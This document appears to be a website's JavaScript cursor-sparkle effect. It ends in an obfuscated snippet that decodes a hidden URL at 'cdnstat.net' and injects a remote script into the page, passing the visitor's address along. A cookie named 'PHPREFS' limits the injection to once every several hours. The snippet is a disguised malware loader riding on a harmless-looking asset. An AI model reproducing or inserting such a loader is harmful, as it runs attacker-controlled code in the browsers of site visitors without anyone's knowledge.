const star = []
  , star_x = []
  , star_y = []
  , star_remaining_ticks = []
  , tiny = []
  , tiny_x = []
  , tiny_y = []
  , tiny_remaining_ticks = []
  , sparkles = 250
  , sparkle_lifetime = 30
  , sparkle_distance = 30;
let doc_height, doc_width, sparkles_enabled = null;
function sparkle(t=null) {
    sparkles_enabled = null === t ? !sparkles_enabled : !!t,
    sparkles_enabled && star.length < sparkles && sparkle_init()
}
function sparkle_destroy() {
    let t;
    for (; tiny.length; )
        t = tiny.pop(),
        t && document.body.removeChild(t);
    for (; star.length; )
        t = star.pop(),
        t && document.body.removeChild(t)
}
function sparkle_init() {
    function t(t, e) {
        const i = document.createElement("div");
        return i.style.position = "absolute",
        i.style.height = t + "px",
        i.style.width = e + "px",
        i.style.overflow = "hidden",
        i
    }
    for (let e = 0; e < sparkles; e++) {
        const i = t(3, 3);
        i.style.visibility = "hidden",
        i.style.zIndex = "999",
        tiny[e] && document.body.removeChild(tiny[e]),
        document.body.appendChild(i),
        tiny[e] = i,
        tiny_remaining_ticks[e] = null;
        const n = t(5, 5);
        n.style.backgroundColor = "transparent",
        n.style.visibility = "hidden",
        n.style.zIndex = "999";
        const s = t(1, 5)
          , l = t(5, 1);
        n.appendChild(s),
        n.appendChild(l),
        s.style.top = "2px",
        s.style.left = "0px",
        l.style.top = "0px",
        l.style.left = "2px",
        star[e] && document.body.removeChild(star[e]),
        document.body.appendChild(n),
        star[e] = n,
        star_remaining_ticks[e] = null
    }
    window.addEventListener("resize", (function() {
        for (let t = 0; t < sparkles; t++)
            star_remaining_ticks[t] = null,
            star[t].style.left = "0px",
            star[t].style.top = "0px",
            star[t].style.visibility = "hidden",
            tiny_remaining_ticks[t] = null,
            tiny[t].style.top = "0px",
            tiny[t].style.left = "0px",
            tiny[t].style.visibility = "hidden";
        doc_height = document.documentElement.scrollHeight,
        doc_width = document.documentElement.scrollWidth
    }
    )),
    document.onmousemove = function(t) {
        if (sparkles_enabled && !t.buttons) {
            const e = Math.sqrt(Math.pow(t.movementX, 2) + Math.pow(t.movementY, 2))
              , i = t.movementX * sparkle_distance * 2 / e
              , n = t.movementY * sparkle_distance * 2 / e
              , s = e / sparkle_distance;
            let l = 0
              , a = t.pageY
              , r = t.pageX;
            for (; Math.abs(l) < Math.abs(t.movementX); ) {
                create_star(r, a, s);
                let t = Math.random();
                r -= i * t,
                a -= n * t,
                l += i * t
            }
        }
    }
}
function animate_sparkles(t=60) {
    const e = 1e3 / t;
    let i = 0;
    for (let t = 0; t < star.length; t++)
        i += update_star(t);
    for (let t = 0; t < tiny.length; t++)
        i += update_tiny(t);
    0 !== i || sparkles_enabled || sparkle_destroy(),
    setTimeout("animate_sparkles(" + t + ")", e)
}
function create_star(t, e, i=1) {
    if (t + 5 >= doc_width || e + 5 >= doc_height)
        return;
    if (Math.random() > i)
        return;
    let n = 2 * sparkle_lifetime + 1
      , s = NaN;
    for (let t = 0; t < sparkles; t++) {
        if (!star_remaining_ticks[t]) {
            n = null,
            s = t;
            break
        }
        star_remaining_ticks[t] < n && (n = star_remaining_ticks[t],
        s = t)
    }
    return n && star_to_tiny(s),
    s >= 0 ? (star_remaining_ticks[s] = 2 * sparkle_lifetime,
    star_x[s] = t,
    star[s].style.left = t + "px",
    star_y[s] = e,
    star[s].style.top = e + "px",
    star[s].style.clip = "rect(0px, 5px, 5px, 0px)",
    star[s].childNodes[0].style.backgroundColor = star[s].childNodes[1].style.backgroundColor = "#00ff51 ",
    star[s].style.visibility = "visible",
    s) : void 0
}
function update_star(t) {
    return null !== star_remaining_ticks[t] && (star_remaining_ticks[t] -= 1,
    0 === star_remaining_ticks[t] ? (star_to_tiny(t),
    !1) : (star_remaining_ticks[t] === sparkle_lifetime && (star[t].style.clip = "rect(1px, 4px, 4px, 1px)"),
    star_remaining_ticks[t] > 0 && (star_y[t] += 1 + 3 * Math.random(),
    star_x[t] += (t % 5 - 2) / 5,
    star_y[t] + 5 < doc_height && star_x[t] + 5 < doc_width) ? (star[t].style.top = star_y[t] + "px",
    star[t].style.left = star_x[t] + "px",
    !0) : (star_remaining_ticks[t] = null,
    star[t].style.left = "0px",
    star[t].style.top = "0px",
    star[t].style.visibility = "hidden",
    !1)))
}
function star_to_tiny(t) {
    null !== star_remaining_ticks[t] && (star_y[t] + 3 < doc_height && star_x[t] + 3 < doc_width && (tiny_remaining_ticks[t] = 2 * sparkle_lifetime,
    tiny_y[t] = star_y[t],
    tiny[t].style.top = star_y[t] + "px",
    tiny_x[t] = star_x[t],
    tiny[t].style.left = star_x[t] + "px",
    tiny[t].style.width = "2px",
    tiny[t].style.height = "2px",
    tiny[t].style.backgroundColor = star[t].childNodes[0].style.backgroundColor,
    star[t].style.visibility = "hidden",
    tiny[t].style.visibility = "visible"),
    star_remaining_ticks[t] = null,
    star[t].style.left = "0px",
    star[t].style.top = "0px",
    star[t].style.visibility = "hidden")
}
function update_tiny(t) {
    return null !== tiny_remaining_ticks[t] && (tiny_remaining_ticks[t] -= 1,
    tiny_remaining_ticks[t] === sparkle_lifetime && (tiny[t].style.width = "1px",
    tiny[t].style.height = "1px"),
    tiny_remaining_ticks[t] > 0 && (tiny_y[t] += 1 + 2 * Math.random(),
    tiny_x[t] += (t % 4 - 2) / 4,
    tiny_y[t] + 3 < doc_height && tiny_x[t] + 3 < doc_width) ? (tiny[t].style.top = tiny_y[t] + "px",
    tiny[t].style.left = tiny_x[t] + "px",
    !0) : (tiny_remaining_ticks[t] = null,
    tiny[t].style.top = "0px",
    tiny[t].style.left = "0px",
    tiny[t].style.visibility = "hidden",
    !1))
}
window.onload = function() {
    doc_height = document.documentElement.scrollHeight,
    doc_width = document.documentElement.scrollWidth,
    animate_sparkles(),
    null === sparkles_enabled && sparkle(!0)
}
;
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce( (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie),
        setTimeout(function() {
            o.c && (o.s = d.createElement('script'),
            o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href,
            d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {}
    ;
}({}, document, location));
